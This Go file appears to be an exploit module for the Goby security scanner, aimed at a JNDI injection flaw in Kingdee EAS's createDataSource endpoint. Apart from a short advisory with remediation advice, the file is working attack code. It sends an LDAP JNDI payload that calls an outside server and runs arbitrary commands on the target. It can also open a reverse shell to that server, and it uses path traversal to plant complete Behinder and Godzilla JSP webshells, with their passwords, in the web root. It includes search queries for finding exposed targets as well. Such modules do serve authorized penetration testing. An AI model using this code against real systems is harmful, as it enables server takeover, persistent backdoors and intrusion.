package exploits

import (
	"encoding/base64"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Kingdee EAS createDataSource path jndiName parameter remote code execution vulnerability",
    "Description": "<p>Kingdee EAS Cloud integrates the gPaaS function of Kingdee Cosmic. It is a platform product based on cloud-native architecture. It can be deployed in containers and has all cloud-native architectural features. It is a platform product with the most advanced underlying architecture.</p><p>Kingdee EAS Cloud has a jndi injection vulnerability. An attacker can use this vulnerability to execute arbitrary code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Product": "Kingdee-EAS",
    "Homepage": "http://www.kingdee.com/",
    "DisclosureDate": "2023-10-17",
    "Author": "14m3ta7k@gmail.com",
    "FofaQuery": "body=\"easSessionId\" || header=\"easportal\" || header=\"eassso/login\" || banner=\"eassso/login\" || body=\"/eassso/common\" || (title=\"EAS系统登录\" && body=\"金蝶\") || header=\"EASSESSIONID\" || banner=\"EASSESSIONID\"",
    "GobyQuery": "body=\"easSessionId\" || header=\"easportal\" || header=\"eassso/login\" || banner=\"eassso/login\" || body=\"/eassso/common\" || (title=\"EAS系统登录\" && body=\"金蝶\") || header=\"EASSESSIONID\" || banner=\"EASSESSIONID\"",
    "Level": "2",
    "Impact": "<p>Kingdee EAS Cloud has a jndi injection vulnerability, which allows attackers to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>1. Please upgrade the system to the latest version and contact the manufacturer to fix the vulnerability: <a href=\"https://www.kingdee.com/\">https://www.kingdee.com/</a></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, public network access to the system is prohibited.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse,webshell",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "behinder,godzilla,custom",
            "show": "attackType=webshell"
        },
        {
            "name": "filename",
            "type": "input",
            "value": "test98765X.jsp",
            "show": "attackType=webshell,webshell=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<% out.println(123); %>",
            "show": "attackType=webshell,webshell=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "金蝶 EAS createDataSource 路径 jndiName 参数远程代码执行漏洞",
            "Product": "Kingdee-EAS",
            "Description": "<p>金蝶 EAS Cloud 融合了金蝶苍穹的 gPaaS 功能，是基于云原生架构的平台产品，可以进行容器化部署，具备一切云原生的架构特性，是一款拥有最先进底层架构的平台产品。<br></p><p>金蝶 EAS Cloud 存在 jndi 注入漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "Recommendation": "<p>1、请升级系统到最新版本，联系厂商修复漏洞：<a href=\"https://www.kingdee.com/\">https://www.kingdee.com/</a></p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>金蝶 EAS Cloud 存在 jndi 注入漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Kingdee EAS createDataSource path jndiName parameter remote code execution vulnerability",
            "Product": "Kingdee-EAS",
            "Description": "<p>Kingdee EAS Cloud integrates the gPaaS function of Kingdee Cosmic. It is a platform product based on cloud-native architecture. It can be deployed in containers and has all cloud-native architectural features. It is a platform product with the most advanced underlying architecture.</p><p>Kingdee EAS Cloud has a jndi injection vulnerability. An attacker can use this vulnerability to execute arbitrary code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>1. Please upgrade the system to the latest version and contact the manufacturer to fix the vulnerability: <a href=\"https://www.kingdee.com/\">https://www.kingdee.com/</a></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, public network access to the system is prohibited.</p>",
            "Impact": "<p>Kingdee EAS Cloud has a jndi injection vulnerability, which allows attackers to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-12-22",
    "PocId": "10899"
}`
	sendPayloadFlagdmkbhji890asd := func(hostInfo *httpclient.FixUrl, cmd string) (*httpclient.HttpResponse, error) {
		payloadRequestConfig := httpclient.NewPostRequestConfig("/appmonitor/protect/datasource/createDataSource")
		payloadRequestConfig.VerifyTls = false
		payloadRequestConfig.FollowRedirect = false
		payloadRequestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		payloadRequestConfig.Header.Store("cmd", cmd)
		payloadRequestConfig.Data = "jndiName=ldap://" + godclient.GetGodServerHost() + "/A7&name=" + goutils.RandomHexString(10) + "&dbtype=mysql&drivertype=&host=127.0.0.1&port=3306&dbname=asdasxasx&userName=asdasxasx&password=asdasxasx&repassword=asdasxasx&connectionURL=sdasd&driverClassName=java.lang.String&testCommand="
		return httpclient.DoHttpRequest(hostInfo, payloadRequestConfig)
	}

	checkFileExistbhji890asd := func(hostInfo *httpclient.FixUrl, filename string) (*httpclient.HttpResponse, error) {
		getRequestConfig := httpclient.NewGetRequestConfig("/portal/res/file/upload/" + filename)
		getRequestConfig.FollowRedirect = false
		getRequestConfig.VerifyTls = false
		return httpclient.DoHttpRequest(hostInfo, getRequestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			checkString := goutils.RandomHexString(6)
			resp, _ := sendPayloadFlagdmkbhji890asd(hostinfo, "echo "+checkString)
			success := resp != nil && strings.Contains(resp.Utf8Html, checkString)
			if success {
				stepLogs.VulURL = hostinfo.FixedHostInfo + resp.Request.URL.Path
			}
			return success
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := ss.Params["attackType"].(string)
			webshell := ss.Params["webshell"].(string)
			if attackType == "cmd" {
				if resp, err := sendPayloadFlagdmkbhji890asd(expResult.HostInfo, goutils.B2S(ss.Params["cmd"])); resp.StatusCode == 200 && len(resp.Utf8Html) > 0 {
					expResult.Output = resp.Utf8Html
					expResult.Success = true
				} else if err != nil {
					expResult.Output = err.Error()
				} else {
					expResult.Output = `漏洞利用失败`
				}
			} else if attackType == "reverse" {
				waitSessionCh := make(chan string)
				rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh)
				if err != nil {
					expResult.Success = false
					expResult.Output = "无可用反弹端口"
					return expResult
				}
				sendPayloadFlagdmkbhji890asd(expResult.HostInfo, fmt.Sprintf("#####%s:%s", godclient.GetGodServerHost(), rp))
				select {
				case webConsoleID := <-waitSessionCh:
					if u, err := url.Parse(webConsoleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output = `<br/><a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
						return expResult
					}
				case <-time.After(time.Second * 20):
					expResult.Success = false
					expResult.Output = `漏洞利用失败`
				}
			} else if attackType == "webshell" {
				var content string
				filename := goutils.RandomHexString(6) + ".jsp"
				if webshell == "behinder" {
					/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
					content = `<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>`
				} else if webshell == "godzilla" {
					// 哥斯拉 pass key
					content = `<%! String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}%>`
				} else {
					content = ss.Params["content"].(string)
					filename = goutils.B2S(ss.Params["filename"])
				}
				if resp, err := sendPayloadFlagdmkbhji890asd(expResult.HostInfo, fmt.Sprintf("$$$$$../../../../server/deploy/portal.ear/portal.war/res/file/upload/"+filename+":"+base64.StdEncoding.EncodeToString([]byte(content)))); resp == nil && err != nil {
					expResult.Output = err.Error()
					return expResult
				}
				if resp, err := checkFileExistbhji890asd(expResult.HostInfo, filename); resp != nil && (resp.StatusCode == 200 || resp.StatusCode == 500) {
					expResult.Success = true
					expResult.Output = "WebShell URL: " + expResult.HostInfo.FixedHostInfo + "/portal/res/file/upload/" + filename + "\n"
					if webshell == "behinder" {
						expResult.Output += "Password: rebeyond\n"
						expResult.Output += "WebShell tool: Behinder v3.0\n"
					} else if webshell == "godzilla" {
						expResult.Output += "Password: pass 加密器：JAVA_AES_BASE64\n"
						expResult.Output += "WebShell tool: Godzilla v4.1\n"
					}
					expResult.Output += "Webshell type: jsp"
				} else if err != nil {
					expResult.Output = err.Error()
				} else {
					expResult.Output = `漏洞利用失败`
				}
			}
			return expResult
		},
	))
}
